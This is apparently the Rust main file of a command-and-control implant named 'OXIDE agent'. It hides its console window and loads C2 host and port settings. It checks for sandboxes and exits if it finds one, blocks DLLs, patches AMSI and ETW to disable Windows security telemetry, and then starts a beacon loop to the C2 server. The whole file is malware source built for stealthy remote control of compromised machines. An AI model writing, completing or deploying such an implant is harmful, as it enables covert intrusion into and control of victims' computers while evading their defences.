// Hide the console window when running on Windows
#![cfg_attr(windows, windows_subsystem = "windows")]
#![allow(dead_code, unused_imports, unused_variables)]

mod beacon;
mod comms;
mod config;
mod debug;
mod evasion;
mod postex;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // Set a panic hook that writes to the debug log before aborting,
    // so we always know WHY the agent crashed even with no console.
    std::panic::set_hook(Box::new(|info| {
        let msg = format!("PANIC: {info}");
        crate::debug::log(&msg);
    }));

    dbg_log!("=== OXIDE agent starting ===");
    dbg_log!("PID={} OS={} ARCH={}", std::process::id(), std::env::consts::OS, std::env::consts::ARCH);

    dbg_log!("loading config...");
    let cfg = config::load();
    dbg_log!("config ok — build_id={} c2={}:{} proto={} sleep={}ms sandbox_evasion={} amsi={} etw={} block_dlls={}",
        cfg.build_id, cfg.c2_host, cfg.c2_port, cfg.protocol, cfg.sleep_ms,
        cfg.sandbox_evasion, cfg.amsi_bypass, cfg.etw_bypass, cfg.block_dlls);

    if cfg.sandbox_evasion {
        dbg_log!("running sandbox checks...");
        dbg_log!("  check: hostname={} username={}",
            std::env::var("COMPUTERNAME").unwrap_or_else(|_| "?".into()),
            std::env::var("USERNAME").unwrap_or_else(|_| "?".into()));
        if evasion::is_sandbox() {
            dbg_log!("SANDBOX DETECTED — agent will exit without connecting!");
            dbg_log!("  hint: hostname starting with 'DESKTOP-' triggers false positive");
            return Ok(());
        }
        dbg_log!("sandbox checks passed — not a sandbox");
    } else {
        dbg_log!("sandbox_evasion disabled — skipping checks");
    }

    dbg_log!("hardening process (block_dlls={})", cfg.block_dlls);
    evasion::harden(cfg.block_dlls);
    dbg_log!("hardening done");

    if cfg.amsi_bypass {
        dbg_log!("patching AMSI...");
        evasion::amsi::patch();
        dbg_log!("AMSI patched");
    }
    if cfg.etw_bypass {
        dbg_log!("patching ETW...");
        evasion::etw::patch();
        dbg_log!("ETW patched");
    }

    dbg_log!("starting beacon loop — will connect to {}://{}:{}",
        cfg.protocol, cfg.c2_host, cfg.c2_port);
    if let Err(e) = beacon::run(cfg).await {
        dbg_log!("beacon loop FATAL error: {e}");
        return Err(e);
    }

    dbg_log!("agent exiting cleanly");
    Ok(())
}
